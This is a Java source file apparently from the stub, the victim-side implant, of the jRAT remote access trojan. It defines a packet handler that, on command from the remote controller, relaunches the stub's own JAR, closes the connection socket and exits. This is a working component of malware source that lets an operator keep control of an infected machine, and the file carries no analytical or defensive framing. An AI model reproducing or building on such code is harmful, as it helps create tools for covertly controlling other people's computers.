package io.jrat.stub.packets.incoming;

import io.jrat.common.downloadable.JavaArchive;
import io.jrat.stub.Connection;
import io.jrat.stub.utils.Utils;

import java.io.File;

public class Packet37RestartJavaProcess extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		File file = new File(Utils.getJarFile().getAbsolutePath());

		if (file.isFile()) {
			JavaArchive jar = new JavaArchive();
			jar.execute(file);
			
			try {
				con.getSocket().close();
			} catch (Exception ex) {
				
			}
			
			System.exit(0);
		}
	}

}
